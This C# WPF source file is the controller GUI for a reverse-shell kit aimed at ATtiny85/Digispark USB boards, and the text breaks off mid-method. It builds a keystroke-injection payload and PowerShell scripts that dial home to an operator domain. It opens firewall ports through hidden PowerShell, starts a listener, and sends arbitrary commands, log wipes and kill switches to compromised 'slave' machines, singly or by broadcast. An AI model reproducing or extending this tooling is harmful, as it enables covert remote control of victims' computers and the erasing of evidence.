﻿using System;
using System.Windows;
using System.Windows.Documents;
using System.Text.Json;
using System.IO;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Windows.Forms;
using System.Net.Http;
using System.IO.Compression;
using System.Windows.Threading;


namespace attiny85_rshell { 

    public partial class MainWindow : Window {

        public MasterState MasterStateObj = new MasterState();

        public MainWindow() {
            InitializeComponent();
            FirewallPreflight();
            PreflightDirectoryChecks();

        }

        //MasterClient 
        private void MasterClientStart(object sender, RoutedEventArgs e) {
            if (!CheckExecutionPolicy()) {
                return;
            }
            string fileName = "..\\..\\..\\data\\master_client.json";
            if (!File.Exists(fileName)) {
                System.Windows.MessageBox.Show("master_client.json file does not exist. Run master client configuration on the main page.","Config doesnt exist", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            } else {
            
            
            }
            if (!MasterStateObj.IsFirewallInit) {
                FireWallClientInRuleCheck();
                FireWallClientOutRuleCheck();
            }
            MasterClientLaunch();

        }
        private void MasterClientLaunch() {
            string fileName = "..\\..\\..\\data\\master_client.json";
            string jsonString = File.ReadAllText(fileName);
            MasterClientConf conf = JsonSerializer.Deserialize<MasterClientConf>(jsonString)!;
            MasterStateObj.MasterClientObj = new MasterClient(conf.TargetServerIp, conf.TargetServerPort);
            MasterStateObj.MasterClientObj.landing_log = landing_page_log;
            MasterStateObj.MasterClientObj.BufferPumpTimer = new DispatcherTimer();
            MasterStateObj.MasterClientObj.BufferPumpTimer.Tick += new EventHandler(MasterStateObj.MasterClientObj.BufferPump);
            MasterStateObj.MasterClientObj.BufferPumpTimer.Interval = new TimeSpan(0, 0, 1);
            MasterStateObj.MasterClientObj.BufferPumpTimer.Start();
            
            FlowDocument myFlowDoc = new FlowDocument();
            myFlowDoc.Blocks.Add(new Paragraph(new Run(MasterStateObj.MasterClientObj.StartClient())));
            landing_page_log.Document = myFlowDoc;
        }
        private void MasterClientQueryClientList(object sender, RoutedEventArgs e) {
            if (MasterStateObj.MasterClientObj == null) {
                System.Windows.MessageBox.Show("MasterClient is null. Start master client.");
                return;
            }
            FlowDocument myFlowDoc = new FlowDocument();
            myFlowDoc.Blocks.Add(new Paragraph(new Run(MasterStateObj.MasterClientObj.ClientListQuery())));
            landing_page_log.Document = myFlowDoc;
        }
        private void MasterClientDisconnectSlave(object sender, RoutedEventArgs e) {
            //--client_shutdown
            if (MasterStateObj.MasterClientObj == null) {
                System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.","Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            try {
                if (broadcast_checkbox.IsChecked ?? true) {
                    MasterStateObj.MasterClientObj.RunCommand("BC", "--client_shutdown", true);
                } else {
                    int client_id_int = Int32.Parse(client_id_textbox.Text);
                    MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, "--client_shutdown", false);
                }

            } catch (Exception ex) {
                System.Windows.MessageBox.Show(ex.ToString());
            }
        }
        private void MasterClientClearSlaveLog(object sender, RoutedEventArgs e) {
            //RunCommand
            //--log_wipe
            if (MasterStateObj.MasterClientObj == null) {
                System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.", "Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            try {
                if (broadcast_checkbox.IsChecked ?? true) {
                    MasterStateObj.MasterClientObj.RunCommand("BC", "--log_wipe", true);
                } else {
                    int client_id_int = Int32.Parse(client_id_textbox.Text);
                    MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, "--log_wipe", false);
                }

            } catch (Exception ex) {
                System.Windows.MessageBox.Show(ex.ToString());
            }
        }
        private void MasterClientSlaveKillswitch(object sender, RoutedEventArgs e) {
            //--kill_switch
            if (System.Windows.MessageBox.Show("Are you sure you want to permenantly shut down this/these slave connections?", "Are you sure", MessageBoxButton.YesNo, MessageBoxImage.Exclamation) == MessageBoxResult.Yes) {
                if (MasterStateObj.MasterClientObj == null) {
                    System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.", "Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                try {
                    if (broadcast_checkbox.IsChecked ?? true) {
                        MasterStateObj.MasterClientObj.RunCommand("BC", "--kill_switch", true);
                    } else {
                        int client_id_int = Int32.Parse(client_id_textbox.Text);
                        MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, "--kill_switch", false);
                    }

                } catch (Exception ex) {
                    System.Windows.MessageBox.Show(ex.ToString());
                }
            }
        }
        private void MasterClientRunUserCommand(object sender, RoutedEventArgs e) {
            try {
                if (broadcast_checkbox.IsChecked ?? true) {
                    System.Windows.MessageBox.Show("TRIGGER");
                    MasterStateObj.MasterClientObj.RunCommand("BC", user_command_textbox.Text, true);
                } else {
                    int client_id_int = Int32.Parse(client_id_textbox.Text);
                    MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, user_command_textbox.Text, false);
                }
                
            } catch (Exception ex) {
                System.Windows.MessageBox.Show(ex.ToString());
            }
            user_command_textbox.Text = "";
        }



        private void MasterClientCommandEnterKeyPress(object sender, System.Windows.Input.KeyEventArgs e) {
            if (e.Key == System.Windows.Input.Key.Enter) {
                if (MasterStateObj.MasterClientObj == null) {
                    System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.", "Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                try {
                    if (broadcast_checkbox.IsChecked ?? true) {
                        MasterStateObj.MasterClientObj.RunCommand("BC", user_command_textbox.Text, true);
                    } else {
                        int client_id_int = Int32.Parse(client_id_textbox.Text);
                        MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, user_command_textbox.Text, false);
                    }

                } catch (Exception ex) {
                    System.Windows.MessageBox.Show(ex.ToString());
                }
                user_command_textbox.Text = "";
            }
        }
        private void MasterClientConfigureView(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 1);
            //MessageBox.Show("Hello");
        }
        private void MasterClientConfigBack(object sender, RoutedEventArgs e) {
            //MessageBox.Show("Hello");
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 0);
        }
        private void MasterClientConfigSubmit(object sender, RoutedEventArgs e) {
            Regex re_proto_catch = new Regex(@"(https://|http://)(.+)");
            if (!re_proto_catch.IsMatch(master_client_domain_textbox.Text)) {
                System.Windows.MessageBox.Show("Must use fully qualified domain name and protocol. ex. https://testing.com");
                return;
            }
            
            if (File.Exists("../../../data/master_client.json")) {
                string question = "master_client.json already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }

            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 0);
            MasterClientConf master_client = new MasterClientConf(master_client_domain_textbox.Text, master_client_server_port.Text);

            string jsonString = JsonSerializer.Serialize(master_client);
            using (StreamWriter writetext = new StreamWriter("../../../data/master_client.json")) {                
                writetext.WriteLine(jsonString);
            }
            FlowDocument myFlowDoc = new FlowDocument();
            myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote: ../../../data/master_client.json")));
            landing_page_log.Document = myFlowDoc;
        }


        //Server
        private void RunServerClick(object sender, RoutedEventArgs e) {
            if (!CheckExecutionPolicy()) {
                return;
            }
            if (File.Exists("..\\..\\..\\scripts\\rs_server.ps1")) {
                FireWallServerOutRuleCheck();
                FireWallServerInRuleCheck();
                using (Process myProcess = new Process()) {

                    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
                    myProcess.StartInfo.UseShellExecute = true;
                    myProcess.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                    myProcess.StartInfo.CreateNoWindow = true;
                    myProcess.StartInfo.Arguments = "..\\..\\..\\scripts\\rs_server.ps1";
                    if (myProcess.Start()) {
                        MasterStateObj.GlobalServerID = myProcess.Id;
                        FlowDocument myFlowDoc = new FlowDocument();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Server Started Succesfully.")));
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Server ID: " + MasterStateObj.GlobalServerID.ToString())));
                        landing_page_log.Document.Blocks.Clear();
                        landing_page_log.Document = myFlowDoc;
                    } else {
                        System.Windows.MessageBox.Show("Failed to boot server. Check Execution policies and try again.");
                        return;
                    }
                }
            } else {
                System.Windows.MessageBox.Show("..\\..\\..\\scripts\\rs_server.ps1 does not exist. Use server configuration button.", "Configured server not found", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
        }
        private void KillServerClick(object sender, RoutedEventArgs e) {
            try {
                Process myProcess = Process.GetProcessById(MasterStateObj.GlobalServerID);
                if (myProcess != null) {
                    myProcess.CloseMainWindow();
                    myProcess.Close();
                    FlowDocument myFlowDoc = new FlowDocument();
                    myFlowDoc.Blocks.Add(new Paragraph(new Run("Server shutdown succesfully.")));
                    landing_page_log.Document.Blocks.Clear();
                    landing_page_log.Document = myFlowDoc;
                } else {
                    System.Windows.MessageBox.Show("Failed to shutdown server process.", "Fail", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }
            } catch (System.ArgumentException) {
                System.Windows.MessageBox.Show("Server is not running.");
            }

        }
        private void ServerConfBackClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(server_configuration_canvas, 0);
        }
        private void ServerConfSubmit(object sender, RoutedEventArgs e) {
            if (File.Exists("../../../scripts/rs_server.ps1")) {
                string question = "../../../scripts/rs_server.ps1 already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }

            if (server_port.Text == "") {
                System.Windows.MessageBox.Show("Server port cannot be empty.", "Entry empty", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            Regex regex = new Regex(@"(.*)<OS_PORT>(.*)");

            string[] lines;


            if (File.Exists("../../../Templates/rs_server.ps1.template")) {
                lines = System.IO.File.ReadAllLines(@"../../../Templates/rs_server.ps1.template");
            }
            else {
                System.Windows.MessageBox.Show("rs_server.ps1.template not found. Reinstall application to fix.", "Critical Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }


            int port;
            bool changes_made = false;
            bool success = int.TryParse(server_port.Text, out port);
            if (!success) {
                //err
            } else {
                if (port > 0 && port < 65537) {
                    for (int i = 0; i < lines.Length; i++) {
                        if (regex.IsMatch(lines[i])) {
                            lines[i] = (regex.Replace(lines[i], "$1") + port.ToString() + regex.Replace(lines[i], "$2"));
                            changes_made = true;
                        }
                    }
                } else {
                    System.Windows.MessageBox.Show("Valid port range is [1 - 65536]");
                    return;
                }
                if (changes_made) {
                    using (StreamWriter writetext = new StreamWriter("../../../scripts/rs_server.ps1")) {
                        foreach (string line in lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                    }
                    FlowDocument myFlowDoc = new FlowDocument();
                    myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote: ../../../scripts/rs_server.ps1")));
                    landing_page_log.Document.Blocks.Clear();
                    landing_page_log.Document = myFlowDoc;
                }
            }

            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(server_configuration_canvas, 0);
        }
        private void ConfigureServerClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(server_configuration_canvas, 1);
        }


        //Firewall

        private void FirewallPreflight() {
            string fileName = "..\\..\\..\\data\\master_client.json";
            if (!File.Exists(fileName)) {
                return;
            }
            FireWallClientInRuleCheck();
            FireWallClientOutRuleCheck();
            MasterStateObj.IsFirewallInit = true;
        }

        private void FireWallClientInRuleCheck() {
            string fileName = "..\\..\\..\\data\\master_client.json";
            string jsonString = File.ReadAllText(fileName);
            MasterClientConf conf = JsonSerializer.Deserialize<MasterClientConf>(jsonString)!;
            var procFWQueryInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            procFWQueryInfo.RedirectStandardOutput = true;
            procFWQueryInfo.UseShellExecute = false;
            procFWQueryInfo.CreateNoWindow = true;
            procFWQueryInfo.Arguments = "Get-NetFirewallRule -DisplayName \"rs1in\"";
            var procFWQueryIN = new Process();
            procFWQueryIN.StartInfo = procFWQueryInfo;
            procFWQueryIN.Start();
            procFWQueryIN.WaitForExit();
            if (procFWQueryIN.ExitCode != 0) {
                var procFWInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
                procFWInfo.RedirectStandardOutput = true;
                procFWInfo.UseShellExecute = false;
                procFWInfo.CreateNoWindow = true;
                procFWInfo.Arguments = "New-NetFirewallRule -DisplayName \"rs1in\" -Direction Inbound -LocalPort " + conf.TargetServerPort + " -Protocol TCP -Action Allow";
                var procFWIN = new Process();
                procFWIN.StartInfo = procFWInfo;
                procFWIN.Start();
                procFWIN.WaitForExit();
                if (procFWIN.ExitCode != 0) {
                    System.Windows.MessageBox.Show("Failed to create inbound firewall rule.");
                    return;
                }
                else {
                    System.Windows.MessageBox.Show("Succesfully created inbound firewall rule.");
                }
            }
        }
        private void FireWallClientOutRuleCheck() {

            string fileName = "..\\..\\..\\data\\master_client.json";
            string jsonString = File.ReadAllText(fileName);
            MasterClientConf conf = JsonSerializer.Deserialize<MasterClientConf>(jsonString)!;
            var procFWQueryInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            procFWQueryInfo.RedirectStandardOutput = true;
            procFWQueryInfo.UseShellExecute = false;
            procFWQueryInfo.CreateNoWindow = true;
            procFWQueryInfo.Arguments = "Get-NetFirewallRule -DisplayName \"rs1out\"";
            var procFWQueryIN = new Process();
            procFWQueryIN.StartInfo = procFWQueryInfo;
            procFWQueryIN.Start();
            procFWQueryIN.WaitForExit();
            if (procFWQueryIN.ExitCode != 0) {
                var procFWInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
                procFWInfo.RedirectStandardOutput = true;
                procFWInfo.UseShellExecute = false;
                procFWInfo.CreateNoWindow = true;
                procFWInfo.Arguments = "New-NetFirewallRule -DisplayName \"rs1out\" -Direction Outbound -LocalPort " + conf.TargetServerPort + " -Protocol TCP -Action Allow";
                var procFWIN = new Process();
                procFWIN.StartInfo = procFWInfo;
                procFWIN.Start();
                procFWIN.WaitForExit();
                if (procFWIN.ExitCode != 0) {
                    System.Windows.MessageBox.Show("Failed to create outbound firewall rule.");
                    return;
                }
                else {
                    System.Windows.MessageBox.Show("Succesfully created outbound firewall rule.");
                }
            }
        }
        private void FireWallServerInRuleCheck() {
            Regex re = new Regex(".*\\[ipaddress\\]::any,\\s([0-9]+).*");
            string port = "";

            string[] lines = File.ReadAllLines("..\\..\\..\\scripts\\rs_server.ps1");
            for (int i = 0; i < lines.Length; i++)
            {
                if (re.IsMatch(lines[i]))
                {
                    port = re.Replace(lines[i], "$1");
                    break;
                }
            }


            var procFWQueryInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            procFWQueryInfo.RedirectStandardOutput = true;
            procFWQueryInfo.UseShellExecute = false;
            procFWQueryInfo.CreateNoWindow = true;
            procFWQueryInfo.Arguments = "Get-NetFirewallRule -DisplayName \"rs1in\"";
            var procFWQueryIN = new Process();
            procFWQueryIN.StartInfo = procFWQueryInfo;
            procFWQueryIN.Start();
            procFWQueryIN.WaitForExit();
            if (procFWQueryIN.ExitCode != 0)
            {
                var procFWInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
                procFWInfo.RedirectStandardOutput = true;
                procFWInfo.UseShellExecute = false;
                procFWInfo.CreateNoWindow = true;
                procFWInfo.Arguments = "New-NetFirewallRule -DisplayName \"rs1in\" -Direction Inbound -LocalPort " + port + " -Protocol TCP -Action Allow";
                var procFWIN = new Process();
                procFWIN.StartInfo = procFWInfo;
                procFWIN.Start();
                procFWIN.WaitForExit();
                if (procFWIN.ExitCode != 0)
                {
                    System.Windows.MessageBox.Show("Failed to create outbound firewall rule.");
                    return;
                }
                else
                {
                    System.Windows.MessageBox.Show("Succesfully created inbound firewall rule.");
                }
            }

        }
        private void FireWallServerOutRuleCheck() {
            Regex re = new Regex(".*\\[ipaddress\\]::any,\\s([0-9]+).*");
            string port = "";

            string[] lines = File.ReadAllLines("..\\..\\..\\scripts\\rs_server.ps1");
            for (int i = 0; i < lines.Length; i++) {
                if (re.IsMatch(lines[i])) {
                    port = re.Replace(lines[i], "$1");
                    break;
                }            
            }

            
            var procFWQueryInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            procFWQueryInfo.RedirectStandardOutput = true;
            procFWQueryInfo.UseShellExecute = false;
            procFWQueryInfo.CreateNoWindow = true;
            procFWQueryInfo.Arguments = "Get-NetFirewallRule -DisplayName \"rs1out\"";
            var procFWQueryIN = new Process();
            procFWQueryIN.StartInfo = procFWQueryInfo;
            procFWQueryIN.Start();
            procFWQueryIN.WaitForExit();
            if (procFWQueryIN.ExitCode != 0) {
                var procFWInfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
                procFWInfo.RedirectStandardOutput = true;
                procFWInfo.UseShellExecute = false;
                procFWInfo.CreateNoWindow = true;
                procFWInfo.Arguments = "New-NetFirewallRule -DisplayName \"rs1out\" -Direction Outbound -LocalPort " + port + " -Protocol TCP -Action Allow";
                var procFWIN = new Process();
                procFWIN.StartInfo = procFWInfo;
                procFWIN.Start();
                procFWIN.WaitForExit();
                if (procFWIN.ExitCode != 0) {
                    System.Windows.MessageBox.Show("Failed to create outbound firewall rule.");
                    return;
                } else {
                    System.Windows.MessageBox.Show("Succesfully created outbound firewall rule.");
                }
            }

            









        }



        

        //Payload 
        private void PayloadConfBackButton(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 0);
            host_fqdn_wan_textbox.Text = "";
            local_host_path_test_display.Text = "";
            dial_home_frequency.Text = "";
            slave_server_textbox.Text = "";
            slave_server_port_textbox.Text = "";
        }
        private void PayloadConfigureButtonClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 1);
        }
        private void PayloadConfigSubmit(object sender, RoutedEventArgs e) {

            if (File.Exists("../../../scripts/rs_tsk.ps1")) {
                string question = "rs_tsk.ps1 already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }
            if (File.Exists("../../../scripts/rs_sl.ps1")) {
                string question = "rs_sl.ps1 already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }
            if (File.Exists("../../../payload_out/payload_out.ino")) {
                string question = "payload_out.ino already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }

            if (host_fqdn_wan_textbox.Text == "") {
                System.Windows.MessageBox.Show("Host FQDN field cannot be empty","Empty Entry", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            if (slave_server_textbox.Text == "") {
                System.Windows.MessageBox.Show("Slave FQDN field cannot be empty", "Empty Entry", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            if (slave_server_port_textbox.Text == "") {
                System.Windows.MessageBox.Show("Slave port field cannot be empty", "Empty Entry", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            if (dial_home_frequency.Text == "") {
                System.Windows.MessageBox.Show("The Dial Back Frequency field cannot be empty. Only accepts an intger value in minutes greater than zero.","Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            try {
                Int64.Parse(dial_home_frequency.Text);
            } catch {
                System.Windows.MessageBox.Show("Failed to parse Dial home frequency into valid number of minutes.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }


            FlowDocument myFlowDoc = new FlowDocument();
            Regex re_port = new Regex(@"(.*)<OS_PORT>(.*)");
            Regex re_dial = new Regex(@"(.*)<DIAL_FREQUENCY>(.*)");
            Regex re_dom = new Regex(@"(.*)<HOST_DOMAIN>(.*)");
            Regex re_slave_server = new Regex(@"(.*)<SLAVE_SERVER_DOMAIN>(.*)");
            Regex re_proto_catch = new Regex(@"(https://|http://)(.+)");
            bool changes_made = false;
            //Set Hosting domains for task and slave   
            ///Task: task_fqdn_wan_textbox
            ///string[] lines;

            string[] tsk_lines;
            string[] paylout_out_lines;
            string[] slave_lines;
            //Write the rs_tsk.ps1 script //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (!File.Exists("../../../Templates/rs_tsk.ps1.template")) {
                myFlowDoc.Blocks.Add(new Paragraph(new Run("rs_tsk.ps1.template not found. Reinstall application to fix.")));
            } else {
                tsk_lines = System.IO.File.ReadAllLines(@"../../../Templates/rs_tsk.ps1.template");
                for (int i = 0; i < tsk_lines.Length; i++) {
                    if (re_dom.IsMatch(tsk_lines[i])) {
                        tsk_lines[i] = (re_dom.Replace(tsk_lines[i], "$1") + host_fqdn_wan_textbox.Text + re_dom.Replace(tsk_lines[i], "$2"));
                        changes_made = true;

                    }
                    if (re_dial.IsMatch(tsk_lines[i])) {
                        tsk_lines[i] = (re_dial.Replace(tsk_lines[i], "$1") + dial_home_frequency.Text + re_dial.Replace(tsk_lines[i], "$2"));
                        changes_made = true;
                    }
                }
                if (changes_made) {
                    //Write file
                    using (StreamWriter writetext = new StreamWriter("../../../scripts/rs_tsk.ps1")) {
                        foreach (string line in tsk_lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote ../../../scripts/rs_tsk.ps1")));
                    }
                    changes_made = false;
                }
            }

            //Write the payload_out.ino file ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (!File.Exists("../../../Templates/payload_out.ino.template")) {
                myFlowDoc.Blocks.Add(new Paragraph(new Run("payload_out.ino.template not found. Reinstall application to fix.")));
            } else {
                paylout_out_lines = System.IO.File.ReadAllLines(@"../../../Templates/payload_out.ino.template");
                for (int i = 0; i < paylout_out_lines.Length; i++) {
                    if (re_dom.IsMatch(paylout_out_lines[i])) {
                        paylout_out_lines[i] = (re_dom.Replace(paylout_out_lines[i], "$1") + host_fqdn_wan_textbox.Text + re_dom.Replace(paylout_out_lines[i], "$2"));
                        changes_made = true;
                        break;
                    }
                }
                if (changes_made) {
                    //Write file
                    using (StreamWriter writetext = new StreamWriter("../../../payload_out/payload_out.ino")) {
                        foreach (string line in paylout_out_lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote ../../../payload_out/payload_out.ino")));
                    }
                    changes_made = false;
                }
            }
            //Write out rs_sl.ps1//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (!File.Exists("../../../Templates/rs_sl.ps1.template")) {
                myFlowDoc.Blocks.Add(new Paragraph(new Run("rs_s1.ps1.template not found. Reinstall application to fix.")));
            } else {
                slave_lines = System.IO.File.ReadAllLines(@"../../../Templates/rs_sl.ps1.template");
                //Look for 
                for (int i = 0; i < slave_lines.Length; i++) {
                    if (re_port.IsMatch(slave_lines[i])) {
                        slave_lines[i] = (re_port.Replace(slave_lines[i], "$1") + slave_server_port_textbox.Text + re_port.Replace(slave_lines[i], "$2"));
                        changes_made = true;
                    }
                    if (re_slave_server.IsMatch(slave_lines[i])) {
                        if (re_proto_catch.IsMatch(slave_server_textbox.Text)) {
                            slave_lines[i] = (re_slave_server.Replace(slave_lines[i], "$1") + re_proto_catch.Replace(slave_server_textbox.Text, "$2") + re_slave_server.Replace(slave_lines[i], "$2"));
                            changes_made = true;
                        } else {
                            System.Windows.MessageBox.Show("Failed to parse domain. Must meet format https://<your_site> or http://<your_site>", "Failed to parse", MessageBoxButton.OK, MessageBoxImage.Error);
                            return;
                        }
                    }
                }
                if (changes_made) {
                    //Write file
                    using (StreamWriter writetext = new StreamWriter("../../../scripts/rs_sl.ps1")) {
                        foreach (string line in slave_lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote ../../../scripts/rs_sl.ps1")));
                    }
                    changes_made = false;
                }
            }

            if (local_host_path_test_display.Text != "") {
                if (File.Exists(local_host_path_test_display.Text+"\\rs_tsk.ps1")) {
                    if (System.Windows.MessageBox.Show(local_host_path_test_display.Text + "\\rs_tsk.ps1" + " already exists. Would you like to replace file at destination?", "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes) {
                        File.Copy("../../../scripts/rs_tsk.ps1", local_host_path_test_display.Text + "\\rs_tsk.ps1", true);                    
                    }
                
                } else {
                    File.Copy("../../../scripts/rs_tsk.ps1", local_host_path_test_display.Text + "\\rs_tsk.ps1");
                }

                if (File.Exists(local_host_path_test_display.Text+"\\rs_sl.ps1")) {
                    if (System.Windows.MessageBox.Show(local_host_path_test_display.Text + "\\rs_sl.ps1" + " already exists. Would you like to replace file at destination?", "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes) {
                        File.Copy("../../../scripts/rs_sl.ps1", local_host_path_test_display.Text + "\\rs_sl.ps1",true);
                    }
                } else {
                    File.Copy("../../../scripts/rs_sl.ps1", local_host_path_test_display.Text + "\\rs_sl.ps1");
                }                
            }
            landing_page_log.Document.Blocks.Clear();
            landing_page_log.Document = myFlowDoc;
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 0);
            host_fqdn_wan_textbox.Text = "";
            local_host_path_test_display.Text = "";
            dial_home_frequency.Text = "";
            slave_server_textbox.Text = "";
            slave_server_port_textbox.Text = "";
        }
        private void PayloadLocalHostCheckboxClick(object sender, RoutedEventArgs e) {
            if (local_hosting_checkbox.IsChecked ?? false) {
                local_host_select_button.IsEnabled = true;
                local_host_path_test_display.IsEnabled = true;
            } else {
                local_host_select_button.IsEnabled = false;
                local_host_path_test_display.IsEnabled = false;
            }
        }
        private void PayloadLocallyHostedSelectButtonClick(object sender, RoutedEventArgs e) {
            FolderBrowserDialog folderBrowserDialog1;
            folderBrowserDialog1 = new System.Windows.Forms.FolderBrowserDialog();
            folderBrowserDialog1.Description ="Select the hosting path for your scripts.";
            folderBrowserDialog1.ShowNewFolderButton = false;
            folderBrowserDialog1.RootFolder = Environment.SpecialFolder.Personal;
            DialogResult result = folderBrowserDialog1.ShowDialog();
            if (result == System.Windows.Forms.DialogResult.OK) {
                string folderName = folderBrowserDialog1.SelectedPath;
                local_host_path_test_display.Text = folderName;
            }
        }
        private void SlaveClientBroadcastCheckBoxClick(object sender, RoutedEventArgs e) {
            if (broadcast_checkbox.IsChecked ?? false) {
                client_id_textbox.IsEnabled = false;
            } else {
                client_id_textbox.IsEnabled = true;
            }
        }
        private void PayloadUploadClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(payload_upload_options_canvas, 1);
        }
        private void PayloadUploadBackClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_upload_options_canvas, 0);
        }
        private void ManualUploadButtonClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(payload_upload_options_canvas, 0);
            System.Windows.Controls.Panel.SetZIndex(payload_upload_manual_option_canvas, 1);
        }
        private void ManualPayloadBackButtonClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(payload_upload_options_canvas, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_upload_manual_option_canvas, 0);
        }
        private void HyperlinkRequestIDE(object sender, RoutedEventArgs e) {
            using (Process myProcess = new Process()) {
                myProcess.StartInfo = new ProcessStartInfo("https://www.arduino.cc/en/software");
                myProcess.StartInfo.UseShellExecute = true;
                myProcess.Start();
                e.Handled = true;
            }
        }
        private void HyperlinkRequestDrivers(object sender, RoutedEventArgs e) {
            using (Process myProcess = new Process()) {
                myProcess.StartInfo = new ProcessStartInfo("https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip");
                myProcess.StartInfo.UseShellExecute = true;
                myProcess.Start();
                e.Handled = true;
            }
        }
        private void HyperlinkRequestDigistump(object sender, RoutedEventArgs e)  {
            using (Process myProcess = new Process())
            {
                myProcess.StartInfo = new ProcessStartInfo("http://digistump.com/products/1");
